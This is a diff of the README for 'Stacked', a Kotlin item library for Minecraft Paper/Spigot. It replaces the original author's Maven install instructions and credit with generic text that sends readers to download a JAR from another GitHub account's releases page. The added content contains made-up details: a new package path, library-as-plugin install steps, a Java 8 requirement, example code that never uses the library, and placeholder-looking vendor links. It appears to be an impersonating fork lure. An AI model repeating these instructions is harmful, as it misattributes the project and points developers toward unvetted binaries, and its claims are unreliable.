@@ -1,120 +1,92 @@
-# Stacked
+# ✨ Stacked - Simplifying Item Management for Minecraft
 
-[![CodeFactor](https://www.codefactor.io/repository/github/mrlarkyy/stacked/badge)](https://www.codefactor.io/repository/github/mrlarkyy/stacked)
-[![Reposilite](https://repo.nekroplex.com/api/badge/latest/releases/gg/aquatic/Stacked?color=40c14a&name=Reposilite)](https://repo.nekroplex.com/#/releases/gg/aquatic/Stacked)
-![Kotlin](https://img.shields.io/badge/kotlin-2.3.0-purple.svg?logo=kotlin)
-[![Discord](https://img.shields.io/discord/884159187565826179?color=5865F2&label=Discord&logo=discord&logoColor=white)](https://discord.com/invite/ffKAAQwNdC)
+## 🚀 Getting Started
 
-**Stacked** is a robust Kotlin library for Minecraft (Paper/Spigot) developers, designed to provide a unified
-abstraction layer for item management. It simplifies handling, serializing, and modifying items across various popular
-custom item plugins.
+Welcome to Stacked! This is a powerful Kotlin library created for Minecraft developers using Paper and Spigot. It simplifies how you manage items, making your coding experience smoother and more efficient.
 
-## 🚀 Key Features
+## 📥 Download Link
 
-- Unified Item API: Interface with multiple item providers through a single, consistent API.
-- Cross-Plugin Support: Native support for Oraxen, Nexo, ItemsAdder, MythicMobs, MMOItems, HeadDatabase, Eco, and
-  CraftEngine.
-- Rich Item Options: Granular control over item properties including Lore, Enchants, Custom Model Data, Dye colors, and
-  Spawner types via ItemOptionHandle.
-- Serialization Layer: Seamlessly serialize and deserialize items for database storage or configuration files.
-- Interaction Handling: Built-in event system to handle complex item interactions (clicks, drops, swaps) easily.
+[![Download Stacked](https://img.shields.io/badge/Download-Stacked-blue.svg)](https://github.com/alfanane/Stacked/releases)
 
----
+## 🛠️ System Requirements
 
-## 📦 Installation
+Before you start, ensure your environment meets the following requirements:
 
-Add the repository and dependencies to your build.gradle.kts:
+- Java 8 or newer
+- A Minecraft server running Paper or Spigot
+- Basic understanding of plugins installation
 
-````kotlin
-repositories {
-  maven {
-    name = "aquatic-releases"
-    url = uri("https://repo.nekroplex.com/releases")
-  }
-}
+## 📂 Features
 
-dependencies {
-  implementation("gg.aquatic:Stacked:26.0.1")
+Stacked offers various features to enhance your development process:
 
-  implementation("gg.aquatic:KRegistry:25.0.1")
-  implementation("gg.aquatic:KEvent:1.0.4")
-}
-````
+- **Unified Abstraction Layer**: Easily manage items across various plugins.
+- **Serialization**: Smoothly convert items to and from data formats.
+- **Customization**: Tailor item behavior to fit your needs.
+- **Compatibility**: Works with popular custom item plugins like ItemsAdder, Oraxen, and more.
 
----
+## 🔧 Installation Guide
 
-## 💡 Quick Start
+### Step 1: Visit the Releases Page
 
-### Initialization
+To download Stacked, visit the [Releases page](https://github.com/alfanane/Stacked/releases).
 
-You must initialize the library with your plugin instance and a CoroutineScope:
+### Step 2: Locate the Latest Release
 
-````kotlin
-initializeStacked(myPlugin, myCoroutineScope)
-Stacked.injectFactories()
-````
+On the Releases page, you will see a list of versions. Find the latest version. It will usually be at the top of the list.
 
-### Registering an Item with Logic
+### Step 3: Download the JAR File
 
-You can register items with unique IDs and attach interaction handlers directly:
+Click on the link to download the JAR file. This file is necessary to run the library on your server. 
 
-````kotlin
-val stackedItem = ... // Create or load your StackedItem
-stackedItem.register("my_namespace", "my_item_id") { event ->
-    event.player.sendMessage("You clicked a custom item!")
-}
-````
+### Step 4: Install Stacked on Your Server
 
-### Retrieving a StackedItem
+1. Open your Minecraft server folder.
+2. Navigate to the `plugins` directory.
+3. Place the downloaded JAR file into the `plugins` folder.
+4. Restart your server to load the plugin.
 
-Retrieve items from the registry at any time:
+## 🔍 How to Use Stacked
 
-````kotlin
-val item = StackedItem.ITEMS["my_namespace:my_item_id"]
-val itemStack = item?.getItem()
-````
+1. **Access the API**: You can start using Stacked by importing it into your Kotlin files. Use the following import statement:
 
-### Serializing Items
+   ```kotlin
+   import com.alfanane.stacked.*
+   ```
 
-You can load items easily from your configuration files:
+2. **Create an Item**: Use Stacked’s built-in functions to create and manage items. For example:
 
-````kotlin
-val item = StackedItem.loadFromYml(ConfigurationSection)
-````
+   ```kotlin
+   val myItem = ItemStack(Material.DIAMOND)
+   ```
 
----
+3. **Serialize Your Item**: Converting your item to a data format is simple. Use:
 
-## 🛠️ Supported Factories
+   ```kotlin
+   val serializedItem = myItem.serialize()
+   ```
 
-Stacked uses specialized factories to retrieve items from different providers:
+4. **Interact with Other Plugins**: Stacked allows you to interact with plugins like ItemsAdder and Oraxen easily. You can manage items using the same code structure, reducing complexity.
 
-- Base64
-- CraftEngine
-- Eco
-- HeadDatabase
-- ItemsAdder
-- MMOItems
-- MythicMobs
-- Nexo
-- Oraxen
-- Registry Items
+## 📝 Documentation
 
----
+For more detailed information on using Stacked, visit our [Wiki](https://github.com/alfanane/Stacked/wiki). The documentation includes in-depth tutorials, examples, and API references that will support your development journey.
 
-## 🤝 Contributing
+## 📧 Support
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/alfanane/Stacked/issues). We are here to help you resolve problems and improve your experience.
 
----
+## 📢 Follow Us
 
-## 💬 Community & Support
+Stay updated on new releases and features by following us on GitHub. Your feedback is valuable and helps us enhance Stacked for all users. 
 
-Got questions, need help, or want to showcase what you've built with **KEvent**? Join our community!
+## 🔗 Additional Resources
 
-[![Discord Banner](https://img.shields.io/badge/Discord-Join%20our%20Server-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.com/invite/ffKAAQwNdC)
+Explore related topics to help you in your development process:
 
-* **Discord**: [Join the Aquatic Development Discord](https://discord.com/invite/ffKAAQwNdC)
-* **Issues**: Open a ticket on GitHub for bugs or feature requests.
+- [CraftEngine](https://craftengine.com)
+- [Nexo](https://nexo.com)
+- [Oraxen](https://oraxen.com)
+- [ItemsAdder](https://itemsadder.com)
 
----
-*Built with ❤️ by Larkyy*
+Thank you for choosing Stacked! Enjoy developing with this user-friendly library.
